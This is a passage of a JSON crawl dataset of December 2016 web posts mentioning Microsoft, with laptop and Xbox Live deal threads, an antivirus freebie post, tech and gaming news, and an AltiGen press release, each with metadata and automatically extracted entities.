            "name": "xiaoice",
            "sentiment": "none"
          }
        ],
        "organizations": [
          {
            "name": "microsoft",
            "sentiment": "neutral"
          },
          {
            "name": "kik",
            "sentiment": "none"
          }
        ],
        "locations": [
          {
            "name": "u.s.",
            "sentiment": "none"
          },
          {
            "name": "china",
            "sentiment": "none"
          }
        ]
      },
      "crawled": "2016-12-06T02:46:35.092+02:00"
    },
    {
      "thread": {
        "uuid": "0c635dc5817a571861a65e52da31ff03604b1d87",
        "url": "http://omgili.com/ri/.wHSUbtEfZTpAYNeM5CifTfjdeUT710W8qZLlQrvLQsBhJODOZOOg2bJLGbNvZc0x43zuaqyE5eduMpejuE3sMkxagWMB8SzTG9xSYq9StO79UDncJysXot3N7D5PpI4K6Oj30sW71cPQhmzRDOsM0n7pUopGaWaYERaA7K7sPOi1hSV_NcRvsRuncwnaaDoqkDlxRAFhqmusiVUdkki_u.HspJmVGhzLyVh.cPV.Bs2zPEl.pQle9BNB9UM3vWXAo0WKHzSEFc2sBh5604Cog--",
        "site_full": "slickdeals.net",
        "site": "slickdeals.net",
        "site_section": "http://slickdeals.net//newsearch.php?searchin=first&forumchoice%5B%5D=9&rss=1",
        "site_categories": [
          "shopping"
        ],
        "section_title": "Slickdeals Hot Deals Forum",
        "title": "$899 + FreeShip: HP Pavilion 17.3\" Laptop 1080p IPS touchscreen i7-6700HQ 12GB DDR4 1TB 7200 RPM HDD NVIDIA GeForce GTX 960M w/4GB graphics memory 6.1lbs Microsoft \"Signature\"",
        "title_full": "$899 + FreeShip: HP Pavilion 17.3\" Laptop 1080p IPS touchscreen i7-6700HQ 12GB DDR4 1TB 7200 RPM HDD NVIDIA GeForce GTX 960M w/4GB graphics memory 6.1lbs Microsoft \"Signature\"",
        "published": "2016-12-06T04:03:07.098+02:00",
        "replies_count": 0,
        "participants_count": 1,
        "site_type": "blogs",
        "country": "US",
        "spam_score": 0.0,
        "main_image": "https://slickdeals.net/images/avatar/sd/new/sd-facebook-5-2.png",
        "performance_score": 0,
        "domain_rank": 269,
        "social": {
          "facebook": {
            "likes": 0,
            "comments": 0,
            "shares": 0
          },
          "gplus": {
            "shares": 0
          },
          "pinterest": {
            "shares": 0
          },
          "linkedin": {
            "shares": 0
          },
          "stumbledupon": {
            "shares": 0
          },
          "vk": {
            "shares": 0
          }
        }
      },
      "uuid": "0c635dc5817a571861a65e52da31ff03604b1d87",
      "url": "http://omgili.com/ri/.wHSUbtEfZTpAYNeM5CifTfjdeUT710W8qZLlQrvLQsBhJODOZOOg2bJLGbNvZc0x43zuaqyE5eduMpejuE3sMkxagWMB8SzTG9xSYq9StO79UDncJysXot3N7D5PpI4K6Oj30sW71cPQhmzRDOsM0n7pUopGaWaYERaA7K7sPOi1hSV_NcRvsRuncwnaaDoqkDlxRAFhqmusiVUdkki_u.HspJmVGhzLyVh.cPV.Bs2zPEl.pQle9BNB9UM3vWXAo0WKHzSEFc2sBh5604Cog--",
      "ord_in_thread": 0,
      "author": "dravid",
      "published": "2016-12-06T04:03:07.098+02:00",
      "title": "$899 + FreeShip: HP Pavilion 17.3\" Laptop 1080p IPS touchscreen i7-6700HQ 12GB DDR4 1TB 7200 RPM HDD NVIDIA GeForce GTX 960M w/4GB graphics memory 6.1lbs Microsoft \"Signature\"",
      "text": "By signing up, you agree to our Terms of Service and Privacy Policy . Must be at least 3 letters or numbers. Must be at least 8 characters. Read the Slickdeals Terms of Service and Acceptable Use Policies . Forum Thread $899 + FreeShip: HP Pavilion 17.3\" Laptop 1080p IPS touchscreen i7-6700HQ 12GB DDR4 1TB 7200 RPM HDD NVIDIA GeForce GTX 960M w/4GB graphics memory 6.1lbs Microsoft \"Signature\"",
      "highlightText": "",
      "highlightTitle": "",
      "language": "english",
      "external_links": [],
      "entities": {
        "persons": [],
        "organizations": [
          {
            "name": "nvidia",
            "sentiment": "neutral"
          },
          {
            "name": "microsoft",
            "sentiment": "neutral"
          },
          {
            "name": "slickdeals terms of service",
            "sentiment": "none"
          }
        ],
        "locations": []
      },
      "crawled": "2016-12-06T04:03:07.098+02:00"
    },
    {
      "thread": {
        "uuid": "1974c2dc246f1f14324add2b54451b230f5430f1",
        "url": "http://omgili.com/ri/jHIAmI4hxg_GpJ8O4AUwsGZIVvczBF0Z0.XDIVxNCsiJeSvkHcsAwoWFi4O_E.l584ALlhLwQqw-",
        "site_full": "www.gofreebies.com",
        "site": "gofreebies.com",
        "site_section": "http://www.gofreebies.com/rss.asp?q=&id=&s=1&idh=",
        "site_categories": [],
        "section_title": "Newest Freebies - GoFreebies.com",
        "title": "How to Get Microsoft's Antivirus Software (Free!)",
        "title_full": "How to Get Microsoft's Antivirus Software (Free!)",
        "published": "2016-12-06T07:06:57.199+02:00",
        "replies_count": 0,
        "participants_count": 0,
        "site_type": "blogs",
        "country": "US",
        "spam_score": 0.0,
        "main_image": "http://www.gofreebies.com/img/gofreebies.com-logo.png",
        "performance_score": 0,
        "domain_rank": 74510,
        "social": {
          "facebook": {
            "likes": 0,
            "comments": 0,
            "shares": 0
          },
          "gplus": {
            "shares": 0
          },
          "pinterest": {
            "shares": 0
          },
          "linkedin": {
            "shares": 0
          },
          "stumbledupon": {
            "shares": 0
          },
          "vk": {
            "shares": 0
          }
        }
      },
      "uuid": "1974c2dc246f1f14324add2b54451b230f5430f1",
      "url": "http://omgili.com/ri/jHIAmI4hxg_GpJ8O4AUwsGZIVvczBF0Z0.XDIVxNCsiJeSvkHcsAwoWFi4O_E.l584ALlhLwQqw-",
      "ord_in_thread": 0,
      "author": "",
      "published": "2016-12-06T07:06:57.199+02:00",
      "title": "How to Get Microsoft's Antivirus Software (Free!)",
      "text": "Microsoft's Free Antivirus Software \nDo you know about Microsoft Security Essentials? It's a top antivirus software for Windows that doesn't come with all of those annoying popups and other bloatware. And it's completely free! \nHow to get it: 1. If you're running Windows you may already have it installed, but you can double check by clicking 'Get Freebie' below!2. Scroll down to learn about the software and see the download links for different languages.3. Run the setup and follow the provided instructions. \nStop paying for antivirus software that already comes free with Windows! This is consistently voted as a top security software, and it never bugs you with popups asking you to renew your license.",
      "highlightText": "",
      "highlightTitle": "",
      "language": "english",
      "external_links": [],
      "entities": {
        "persons": [],
        "organizations": [
          {
            "name": "microsoft",
            "sentiment": "neutral"
          }
        ],
        "locations": []
      },
      "crawled": "2016-12-06T07:06:57.199+02:00"
    },
    {
      "thread": {
        "uuid": "fb0a6f562f924df8ff616e0b41ab22d84b6f6ebe",
        "url": "http://omgili.com/ri/jHIAmI4hxg9BcPFu_4VOJxXOPE7_XaSqHHmPvWoFDz9eYQTio3NGKwJ15U_mU3KAtxgH6K7MUvlYMbL8UBNwkXOILx1rPYtmVOt9LW2JolHIh7bgxl2E96TCcyvIBYfTkP9OFBNG9d8-",
        "site_full": "www.onenewspage.com",
        "site": "onenewspage.com",
        "site_section": "http://www.onenewspage.com/rss/latest/Technology.rss",
        "site_categories": [
          "news",
          "entertainment",
          "education"
        ],
        "section_title": "Latest Technology News on One News Page",
        "title": "Tech giants to set up database of terrorist content",
        "title_full": "Tech giants to set up database of terrorist content - One News Page",
        "published": "2016-12-06T10:15:53.806+02:00",
        "replies_count": 0,
        "participants_count": 1,
        "site_type": "news",
        "country": "US",
        "spam_score": 0.0,
        "main_image": "http://cdn.newsserve.net/ONPglobe128.png",
        "performance_score": 0,
        "domain_rank": 91686,
        "social": {
          "facebook": {
            "likes": 0,
            "comments": 0,
            "shares": 0
          },
          "gplus": {
            "shares": 0
          },
          "pinterest": {
            "shares": 0
          },
          "linkedin": {
            "shares": 0
          },
          "stumbledupon": {
            "shares": 0
          },
          "vk": {
            "shares": 0
          }
        }
      },
      "uuid": "fb0a6f562f924df8ff616e0b41ab22d84b6f6ebe",
      "url": "http://omgili.com/ri/jHIAmI4hxg9BcPFu_4VOJxXOPE7_XaSqHHmPvWoFDz9eYQTio3NGKwJ15U_mU3KAtxgH6K7MUvlYMbL8UBNwkXOILx1rPYtmVOt9LW2JolHIh7bgxl2E96TCcyvIBYfTkP9OFBNG9d8-",
      "ord_in_thread": 0,
      "author": "onenewspage.com",
      "published": "2016-12-06T10:15:53.806+02:00",
      "title": "Tech giants to set up database of terrorist content",
      "text": "Facebook, Twitter, Microsoft and Google's YouTube say they will create a shared database to help them track and remove \"violent terrorist imagery or terrorist recruitment videos.\"",
      "highlightText": "",
      "highlightTitle": "",
      "language": "english",
      "external_links": [],
      "entities": {
        "persons": [],
        "organizations": [
          {
            "name": "google",
            "sentiment": "neutral"
          },
          {
            "name": "facebook",
            "sentiment": "neutral"
          },
          {
            "name": "youtube",
            "sentiment": "neutral"
          },
          {
            "name": "microsoft",
            "sentiment": "neutral"
          }
        ],
        "locations": []
      },
      "crawled": "2016-12-06T10:15:53.806+02:00"
    },
    {
      "thread": {
        "uuid": "734c8f48e4df492144901f43f1f7483868c8879b",
        "url": "http://omgili.com/ri/.wHSUbtEfZTpAYNeM5CifTfjdeUT710WqmQXjsjcvrKSw0blrNxSoVQjP9WH6RIUWzkjQFCxX9KXayCWvhPxk0NQCsPlPdPvj4Si7i9ySibWoMuq0847OGtF_58oyKKEivKYFifXMCsye2YkQKtYg5.FZb2MbmG.M5twqHsE2NPmVXD4sjlzcWLhikboAUfG19YpgVbFkBV3smKHMrA0fc_xbEihda.DnQq5EcfinBNVgRKurjhNr8ffYOMtIX_bGtt9pblhl9AbXMRgBAiJ93Guyra12j8P5rO.bgRRrUA-",
        "site_full": "slickdeals.net",
        "site": "slickdeals.net",
        "site_section": "https://slickdeals.net/forums/forumdisplay.php?f=9",
        "site_categories": [
          "shopping"
        ],
        "section_title": "Slickdeals Hot Deals Forum",
        "title": "EA Access 12-Month Subscription (Digital Code) for $24.99 AC or Microsoft Xbox Live 24-Month Gold Membership (Digital Code) for $80.00 AC @ Newegg.com",
        "title_full": "EA Access 12-Month Subscription (Digital Code) for $24.99 AC or Microsoft Xbox Live 24-Month Gold Membership (Digital Code) for $80.00 AC @ Newegg.com",
        "published": "2016-12-06T10:35:42.878+02:00",
        "replies_count": 0,
        "participants_count": 1,
        "site_type": "blogs",
        "country": "US",
        "spam_score": 0.0,
        "main_image": null,
        "performance_score": 0,
        "domain_rank": 269,
        "social": {
          "facebook": {
            "likes": 0,
            "comments": 0,
            "shares": 0
          },
          "gplus": {
            "shares": 0
          },
          "pinterest": {
            "shares": 0
          },
          "linkedin": {
            "shares": 0
          },
          "stumbledupon": {
            "shares": 0
          },
          "vk": {
            "shares": 0
          }
        }
      },
      "uuid": "734c8f48e4df492144901f43f1f7483868c8879b",
      "url": "http://omgili.com/ri/.wHSUbtEfZTpAYNeM5CifTfjdeUT710WqmQXjsjcvrKSw0blrNxSoVQjP9WH6RIUWzkjQFCxX9KXayCWvhPxk0NQCsPlPdPvj4Si7i9ySibWoMuq0847OGtF_58oyKKEivKYFifXMCsye2YkQKtYg5.FZb2MbmG.M5twqHsE2NPmVXD4sjlzcWLhikboAUfG19YpgVbFkBV3smKHMrA0fc_xbEihda.DnQq5EcfinBNVgRKurjhNr8ffYOMtIX_bGtt9pblhl9AbXMRgBAiJ93Guyra12j8P5rO.bgRRrUA-",
      "ord_in_thread": 0,
      "author": "TDMVP73",
      "published": "2016-12-06T10:35:42.878+02:00",
      "title": "EA Access 12-Month Subscription (Digital Code) for $24.99 AC or Microsoft Xbox Live 24-Month Gold Membership (Digital Code) for $80.00 AC @ Newegg.com",
      "text": "\nThumb Score: +1 Hey guys,\n\nI didn't see this posted, so I thought I'd share.\n\nGaming Subscriptions: EA Access 12-Month Subscription (Xbox One Digital Code) [ newegg.com ] Apply Code: EMCFGEK23 at checkout. Price (after coupon): $24.99 Limit 3 Per Household [LIST][*] Microsoft Xbox Live 24-Month Gold Membership (Digital Code) [ newegg.com ] \n",
      "highlightText": "",
      "highlightTitle": "",
      "language": "english",
      "external_links": [],
      "entities": {
        "persons": [],
        "organizations": [
          {
            "name": "microsoft",
            "sentiment": "neutral"
          }
        ],
        "locations": []
      },
      "crawled": "2016-12-06T10:35:42.878+02:00"
    },
    {
      "thread": {
        "uuid": "d87328873f06d4447c7bcd0c5eed8d0693c07a9e",
        "url": "http://omgili.com/ri/.wHSUbtEfZTpAYNeM5CifTfjdeUT710WqmQXjsjcvrKSw0blrNxSoVQjP9WH6RIUWzkjQFCxX9KXayCWvhPxk0NQCsPlPdPvj4Si7i9ySibWoMuq0847OGtF_58oyKKEivKYFifXMCsye2YkQKtYg5.FZb2MbmG.M5twqHsE2NPmVXD4sjlzcWLhikboAUfG19YpgVbFkBV3smKHMrA0fc_xbEihda.DU_g9AY0SSeE-",
        "site_full": "slickdeals.net",
        "site": "slickdeals.net",
        "site_section": "http://slickdeals.net/newsearch.php?searchin=first&forumchoice%5B%5D=9&rss=1",
        "site_categories": [
          "shopping"
        ],
        "section_title": "Slickdeals Hot Deals Forum",
        "title": "EA Access 12-Month Subscription (Digital Code) for $24.99 AC or Microsoft Xbox Live 24-Month Gold Membership (Digital Code) for $80.00 AC @ Newegg.com",
        "title_full": "EA Access 12-Month Subscription (Digital Code) for $24.99 AC or Microsoft Xbox Live 24-Month Gold Membership (Digital Code) for $80.00 AC @ Newegg.com",
        "published": "2016-12-06T10:54:38.757+02:00",
        "replies_count": 0,
        "participants_count": 1,
        "site_type": "blogs",
        "country": "US",
        "spam_score": 0.0,
        "main_image": "https://static.slickdealscdn.com/attachment/9/4/7/4/7/8/4959880.attach",
        "performance_score": 0,
        "domain_rank": 269,
        "social": {
          "facebook": {
            "likes": 2,
            "comments": 0,
            "shares": 2
          },
          "gplus": {
            "shares": 0
          },
          "pinterest": {
            "shares": 0
          },
          "linkedin": {
            "shares": 0
          },
          "stumbledupon": {
            "shares": 0
          },
          "vk": {
            "shares": 0
          }
        }
      },
      "uuid": "d87328873f06d4447c7bcd0c5eed8d0693c07a9e",
      "url": "http://omgili.com/ri/.wHSUbtEfZTpAYNeM5CifTfjdeUT710WqmQXjsjcvrKSw0blrNxSoVQjP9WH6RIUWzkjQFCxX9KXayCWvhPxk0NQCsPlPdPvj4Si7i9ySibWoMuq0847OGtF_58oyKKEivKYFifXMCsye2YkQKtYg5.FZb2MbmG.M5twqHsE2NPmVXD4sjlzcWLhikboAUfG19YpgVbFkBV3smKHMrA0fc_xbEihda.DU_g9AY0SSeE-",
      "ord_in_thread": 0,
      "author": "TDMVP73",
      "published": "2016-12-06T10:54:38.757+02:00",
      "title": "EA Access 12-Month Subscription (Digital Code) for $24.99 AC or Microsoft Xbox Live 24-Month Gold Membership (Digital Code) for $80.00 AC @ Newegg.com",
      "text": "  Forum Thread EA Access 12-Month Subscription (Digital Code) for $24.99 AC or Microsoft Xbox Live 24-Month Gold Membership (Digital Code) for $80.00 AC @ Newegg.com",
      "highlightText": "",
      "highlightTitle": "",
      "language": "english",
      "external_links": [],
      "entities": {
        "persons": [],
        "organizations": [
          {
            "name": "ac @ newegg.com   forum thread ea",
            "sentiment": "neutral"
          },
          {
            "name": "microsoft",
            "sentiment": "neutral"
          }
        ],
        "locations": []
      },
      "crawled": "2016-12-06T10:54:38.757+02:00"
    },
    {
      "thread": {
        "uuid": "894e3ff71920ede8246b78d1dda8376b6c69dfab",
        "url": "http://omgili.com/ri/jHIAmI4hxg9BcPFu_4VOJxXOPE7_XaSqWQUhP87lSPya9P1cVO4tUYY477Tdf0c_WZLsQaOSdMk2M9LEITVlzw9QfmNY1vy7_5wshkwLujxhtIyUHPgeq5QDa53nxE2UjwuVKiWl2.Q-",
        "site_full": "www.onenewspage.com",
        "site": "onenewspage.com",
        "site_section": "http://www.onenewspage.com/topnewsRSS.php",
        "site_categories": [
          "news",
          "entertainment",
          "education"
        ],
        "section_title": "Latest News on One News Page - Top Headlines and News Videos",
        "title": "Will Nintendo Trade Mario For Microsoft's Banjo?",
        "title_full": "Will Nintendo Trade Mario For Microsoft's Banjo? - One News Page",
        "published": "2016-12-06T12:58:56.702+02:00",
        "replies_count": 0,
        "participants_count": 1,
        "site_type": "news",
        "country": "US",
        "spam_score": 0.0,
        "main_image": "http://cdn.newsserve.net/700/i/20161206/1825-Will-Nintendo-Trade-Mario-For-Microsoft-Banjo.jpg",
        "performance_score": 0,
        "domain_rank": 91686,
        "social": {
          "facebook": {
            "likes": 0,
            "comments": 0,
            "shares": 0
          },
          "gplus": {
            "shares": 0
          },
          "pinterest": {
            "shares": 0
          },
          "linkedin": {
            "shares": 0
          },
          "stumbledupon": {
            "shares": 0
          },
          "vk": {
            "shares": 0
          }
        }
      },
      "uuid": "894e3ff71920ede8246b78d1dda8376b6c69dfab",
      "url": "http://omgili.com/ri/jHIAmI4hxg9BcPFu_4VOJxXOPE7_XaSqWQUhP87lSPya9P1cVO4tUYY477Tdf0c_WZLsQaOSdMk2M9LEITVlzw9QfmNY1vy7_5wshkwLujxhtIyUHPgeq5QDa53nxE2UjwuVKiWl2.Q-",
      "ord_in_thread": 0,
      "author": "onenewspage.com",
      "published": "2016-12-06T12:58:56.702+02:00",
      "title": "Will Nintendo Trade Mario For Microsoft's Banjo?",
      "text": "by Graham Pierrepoint \n\nThe videogame console wars are perhaps a little more complex than we may give them credit – after all, Nintendo have struggled to weather years of changing hardware specs and gamer expectations to be able to announce a new console to arrive in 2017 – and things have certainly changed since the Japanese firm first ruled the roost 25 years ago. Since then, Sega have been and gone, and Sony and Microsoft quickly became the main players in a market that has been largely dominated by Xboxes and PlayStations for nearly two decades. However, Microsoft have been working closely with Nintendo in recent years, and comments made by CEO Phil Spencer about certain IPs have set gamer tongues wagging this week.\n\nMicrosoft, who bought the ground-breaking Minecraft from Mojang some years ago, have been working with Nintendo to bring the open-world discovery sim to their Wii U console, allowing them to not only run the software on its unique touchscreen hardware but to also stamp their own unique design packs on the game – and as a result, the co-operation between firms is said to have been rather harmonious. So much so, that Spencer has advised that he would love to see a Mario title make its way to Xbox, and that he isn’t above sharing one of the most iconic Nintendo 64 characters back with Mario’s makers in future.\n\nBanjo-Kazooie was arguably one of the Nintendo 64 console’s biggest successes, and with a sequel in Banjo Tooie helped to cement Rare as one of the gaming world’s most beloved studios. However, Rare made the leap to Microsoft at the dawn of the Xbox, resulting in Nintendo losing some valuable IPs in the process. Since then, however, the characters of Banjo and Kazooie have barely been seen – they appeared in an Xbox exclusive title, Nuts and Bolts, that repulsed hardcore fans of the series due to its dramatic swerve in character design and game genre. Since then, the bear and bird have only been seen in Sonic and Sega All-Star Racing.\n\nSpencer, however, suggested that Banjo may make the leap to a future Super Smash Bros game for Nintendo, indicating that the door of opportunity for IP sharing is certainly open. However, with Nintendo notoriously protective of their properties – only in recent years relenting to bring their characters to smartphones – it will remain to be seen if the Japanese firm will respond so willingly in return. For now, fans will sadly simply have to wait.",
      "highlightText": "",
      "highlightTitle": "",
      "language": "english",
      "external_links": [],
      "entities": {
        "persons": [
          {
            "name": "graham",
            "sentiment": "negative"
          },
          {
            "name": "xbox",
            "sentiment": "none"
          },
          {
            "name": "spencer",
            "sentiment": "none"
          },
          {
            "name": "phil spencer",
            "sentiment": "none"
          },
          {
            "name": "banjo-kazooie",
            "sentiment": "none"
          },
          {
            "name": "mario",
            "sentiment": "none"
          },
          {
            "name": "banjo tooie",
            "sentiment": "none"
          }
        ],
        "organizations": [
          {
            "name": "microsoft",
            "sentiment": "neutral"
          },
          {
            "name": "sega",
            "sentiment": "none"
          },
          {
            "name": "sony",
            "sentiment": "none"
          },
          {
            "name": "nintendo",
            "sentiment": "none"
          }
        ],
        "locations": [
          {
            "name": "mojang",
            "sentiment": "none"
          }
        ]
      },
      "crawled": "2016-12-06T12:58:56.702+02:00"
    },
    {
      "thread": {
        "uuid": "d52ece5bbb4330ccdb9ebc6deaa57faa460a6060",
        "url": "http://omgili.com/ri/jHIAmI4hxg_yiFlisrewaQAFxnP7mx.qPVZVjWzpSAq_2gGVxWWAQIPwHejekveI5sdxAw5uhls-",
        "site_full": "www.otcmarkets.com",
        "site": "otcmarkets.com",
        "site_section": "http://www.otcmarkets.com/syndicate/rss.xml?symbol=otcm",
        "site_categories": [
          "finance",
          "business"
        ],
        "section_title": "OTC Markets Group - News, Filings & Corporate Actions",
        "title": "AltiGen Communications, Inc. (ATGN: OTCQX U.S.) | AltiGen Named a 30 Fastest Growing Microsoft Solution Provider for its fully managed Unified Communications services",
        "title_full": "AltiGen Communications, Inc. (ATGN: OTCQX U.S.) | AltiGen Named a 30 Fastest Growing Microsoft Solution Provider for its fully managed Unified Communications services",
        "published": "2016-12-06T13:42:38.044+02:00",
        "replies_count": 0,
        "participants_count": 1,
        "site_type": "blogs",
        "country": "US",
        "spam_score": 0.0,
        "main_image": "",
        "performance_score": 0,
        "domain_rank": 27233,
        "social": {
          "facebook": {
            "likes": 0,
            "comments": 0,
            "shares": 0
          },
          "gplus": {
            "shares": 0
          },
          "pinterest": {
            "shares": 0
          },
          "linkedin": {
            "shares": 0
          },
          "stumbledupon": {
            "shares": 0
          },
          "vk": {
            "shares": 0
          }
        }
      },
      "uuid": "d52ece5bbb4330ccdb9ebc6deaa57faa460a6060",
      "url": "http://omgili.com/ri/jHIAmI4hxg_yiFlisrewaQAFxnP7mx.qPVZVjWzpSAq_2gGVxWWAQIPwHejekveI5sdxAw5uhls-",
      "ord_in_thread": 0,
      "author": "OTC Markets Group - News, Filings &amp; Corporate Actions",
      "published": "2016-12-06T13:42:38.044+02:00",
      "title": "AltiGen Communications, Inc. (ATGN: OTCQX U.S.) | AltiGen Named a 30 Fastest Growing Microsoft Solution Provider for its fully managed Unified Communications services",
      "text": "OTCQX U.S. OTCQX Advisor: B. Riley & Co., LLC OTC Disclosure & News Service AltiGen Named a 30 Fastest Growing Microsoft Solution Provider for its fully managed Unified Communications services Dec 06, 2016 \nOTC Disclosure & News Service \n- AltiGen Named a 30 Fastest Growing Microsoft Solution Provider for its fully managed Unified Communications services AltiGen Named a 30 Fastest Growing Microsoft Solution Provider for its fully managed Unified Communications services \nSAN JOSE, CA--(Marketwired - Dec 6, 2016) - AltiGen Communications ( OTCQX : ATGN ) has been named by Silicon Review a \"30 Fastest Growing Microsoft Solution Provider\" for 2016. The Silicon Review, highly regarded and known worldwide as a trusted online and print community for business & technology professionals, gives this distinction annually to 30 companies that are at the forefront of providing unique and innovative Microsoft solutions, impacting the marketplace. Jeremiah Fleming, President, CEO and Chairman of the Board of AltiGen, states, \"We are honored to have received this recognition. I am most grateful to our clients' confidence they have in us to serve their evolving communication needs.\" \nAccording to Silicon Review, \"AltiGen has evolved to become a complete cloud communications solutions provider. By integrating its IP PBX and contact center solutions with Microsoft's Skype for Business and Office 365 AltiGen is now able to uniquely deliver a comprehensive suite of enterprise-class Unified Communications solutions as a fully managed cloud service. It also offers its customers the option to use AltiGen's SIP trunks or use their own service provider, which is particularly beneficial to customers who cannot or do not wish to change service providers.\" \n\"Our all-software solution offers businesses the flexibility to deploy on-premises, in the Cloud, or in a hybrid environment,\" continues Fleming. The biggest challenge AltiGen has faced is \"cutting through the clutter\" in terms of the sheer number of competitors in the UCaaS space. And while other organizations increasingly find themselves in the position of having to compete with Microsoft's Skype for Business and Office 365 Cloud PBX, AltiGen has been able to fully leverage those technologies to deliver a complete, integrated solution to its customers. Specifically, AltiGen's Hosted Skype for Business , MaxACD Cloud Contact Center , Enterprise Cloud PBX , and MaxUC Cloud solutions were recognized for their ability to easily and cost effectively deliver Unified Communications as a Service (UCaaS). \nRead the entire Silicon Review Article at http://thesiliconreview.com/magazines/delivering-the-most-reliable-fully-managed-cloud-unified-communications-services-altigen-communications-inc/ \nAbout AltiGen Communications",
      "highlightText": "",
      "highlightTitle": "",
      "language": "english",
      "external_links": [],
      "entities": {
        "persons": [
          {
            "name": "b. riley",
            "sentiment": "neutral"
          },
          {
            "name": "jeremiah fleming",
            "sentiment": "none"
          },
          {
            "name": "fleming",
            "sentiment": "none"
          }
        ],
        "organizations": [
          {
            "name": "altigen communications, inc.",
            "sentiment": "neutral"
          },
          {
            "name": "llc otc disclosure & news service",
            "sentiment": "neutral"
          },
          {
            "name": "unified communications",
            "sentiment": "neutral"
          },
          {
            "name": "microsoft",
            "sentiment": "neutral"
          },
          {
            "name": "altigen",
            "sentiment": "neutral"
          },
          {
            "name": "skype for business and office 365 cloud pbx",
            "sentiment": "none"
          },
          {
            "name": "skype for business and office",
            "sentiment": "none"
          },
          {
            "name": "silicon review",
            "sentiment": "none"
          },
          {
            "name": "altigen named",
            "sentiment": "none"
          },
          {
            "name": "altigen communications",
            "sentiment": "none"
          },
          {
            "name": "otc disclosure & news service",
            "sentiment": "none"
          }
        ],
        "locations": [
          {
            "name": "u.s.",
            "sentiment": "none"
          },
          {
            "name": "otcqx u.s.",
            "sentiment": "none"
          },
          {
            "name": "ca",
            "sentiment": "none"
          },
          {
            "name": "san jose",
            "sentiment": "none"
          }
        ]
      },
      "crawled": "2016-12-06T13:42:38.044+02:00"
    },
    {
      "thread": {
        "uuid": "0e93c4841af2a0f8e878fedfdb0072da9bd54dfe",
        "url": "http://omgili.com/ri/.wHSUbtEfZTpAYNeM5CifTfjdeUT710WqmQXjsjcvrLM7GSVNZtGhbnzmSB9TdbYgibVKrzm9mqO9D9F2GEieCoYB00hBKiMJvhO_6LuN6QBwk0E7EOp6M0sAHMAMN6q9Ewg4LIbO5UL32InUJtzA2KJymcdWgs4U3wLN3CEZP4kI6Ql__YjPA9Ivr.w2bO9Doe0MAqPpPZcJtMtAkQ6Gr4KZ_upnhODs.r24CIdUudVuMTzfr.Zbu8Mdt642VSZPYsoIrMgjic-",
        "site_full": "slickdeals.net",
        "site": "slickdeals.net",
        "site_section": "http://feeds.feedburner.com/SlickdealsnetUP",
        "site_categories": [
          "shopping"
        ],
        "section_title": "SlickDeals.net",
        "title": "Digital Deals: EA Access 12-Month Subscription for $24.99 AC, Microsoft Xbox Live 24-Month Gold Membership for $80.00 AC, Kohl's $100 Gift Card for $95.00 AC @ Newegg.com (2 replies)",
        "title_full": "Digital Deals: EA Access 12-Month Subscription for $24.99 AC, Microsoft Xbox Live 24-Month Gold Membership for $80.00 AC, Kohl's $100 Gift Card for $95.00 AC @ Newegg.com (2 replies)",
        "published": "2016-12-06T14:47:01.416+02:00",
        "replies_count": 0,
        "participants_count": 0,
        "site_type": "blogs",
        "country": "US",
        "spam_score": 0.0,
        "main_image": "https://static.slickdealscdn.com/attachment/9/4/7/4/7/8/4959880.attach",
        "performance_score": 0,
        "domain_rank": 269,
        "social": {
          "facebook": {
            "likes": 18,
            "comments": 0,
            "shares": 18
          },
          "gplus": {
            "shares": 0
          },
          "pinterest": {
            "shares": 0
          },
          "linkedin": {
            "shares": 0
          },
          "stumbledupon": {
            "shares": 0
          },
          "vk": {
            "shares": 0
          }
        }
      },
      "uuid": "0e93c4841af2a0f8e878fedfdb0072da9bd54dfe",
      "url": "http://omgili.com/ri/.wHSUbtEfZTpAYNeM5CifTfjdeUT710WqmQXjsjcvrLM7GSVNZtGhbnzmSB9TdbYgibVKrzm9mqO9D9F2GEieCoYB00hBKiMJvhO_6LuN6QBwk0E7EOp6M0sAHMAMN6q9Ewg4LIbO5UL32InUJtzA2KJymcdWgs4U3wLN3CEZP4kI6Ql__YjPA9Ivr.w2bO9Doe0MAqPpPZcJtMtAkQ6Gr4KZ_upnhODs.r24CIdUudVuMTzfr.Zbu8Mdt642VSZPYsoIrMgjic-",
      "ord_in_thread": 0,
      "author": "",
      "published": "2016-12-06T14:47:01.416+02:00",
      "title": "Digital Deals: EA Access 12-Month Subscription for $24.99 AC, Microsoft Xbox Live 24-Month Gold Membership for $80.00 AC, Kohl's $100 Gift Card for $95.00 AC @ Newegg.com (2 replies)",
      "text": "By signing up, you agree to our Terms of Service and Privacy Policy . Must be at least 3 letters or numbers. Must be at least 8 characters. Read the Slickdeals Terms of Service and Acceptable Use Policies . Popular Deal Digital Deals: EA Access 12-Month Subscription for $24.99 AC, Microsoft Xbox Live 24-Month Gold Membership for $80.00 AC, Kohl's $100 Gift Card for $95.00 AC @ Newegg.com",
      "highlightText": "",
      "highlightTitle": "",
      "language": "english",
      "external_links": [],
      "entities": {
        "persons": [
          {
            "name": "kohl",
            "sentiment": "neutral"
          }
        ],
        "organizations": [
          {
            "name": "ac",
            "sentiment": "neutral"
          },
          {
            "name": "ac @ newegg.com",
            "sentiment": "neutral"
          },
          {
            "name": "microsoft",
            "sentiment": "neutral"
          },
          {
            "name": "slickdeals terms of service",
            "sentiment": "none"
          }
        ],
        "locations": []
      },
      "crawled": "2016-12-06T14:47:01.416+02:00"
    },
    {
      "thread": {
        "uuid": "87a8e93d401f8b4eef5b5979d8974f2201c0729e",
        "url": "http://omgili.com/ri/.wHSUbtEfZRJcZIzEkwz53VfIySkCw1wljjfqbcCpL1O0ezrZmQ06_VFFjmbKqOIQbdOlCIDeHLwt8OTHP19Vtbcg_A9qPNkFokeB35vc_lgRx4L7zE7qA--",
        "site_full": "mspoweruser.com",
        "site": "mspoweruser.com",
        "site_section": "https://mspoweruser.com",
        "site_categories": [
          "news",
          "tech"
        ],
        "section_title": "MSPoweruser",
        "title": "Microsoft announces support for F# language in Azure Notebooks",
        "title_full": "Microsoft announces support for F# language in Azure Notebooks",
        "published": "2016-12-06T14:47:54.877+02:00",
        "replies_count": 0,
        "participants_count": 1,
        "site_type": "blogs",
        "country": "US",
        "spam_score": 0.0,
        "main_image": null,
        "performance_score": 0,
        "domain_rank": 14067,
        "social": {
          "facebook": {
            "likes": 0,
            "comments": 0,
            "shares": 0
          },
          "gplus": {
            "shares": 0
          },
          "pinterest": {
            "shares": 0
          },
          "linkedin": {
            "shares": 0
          },
          "stumbledupon": {
            "shares": 0
          },
          "vk": {
            "shares": 0
          }
        }
      },
      "uuid": "87a8e93d401f8b4eef5b5979d8974f2201c0729e",
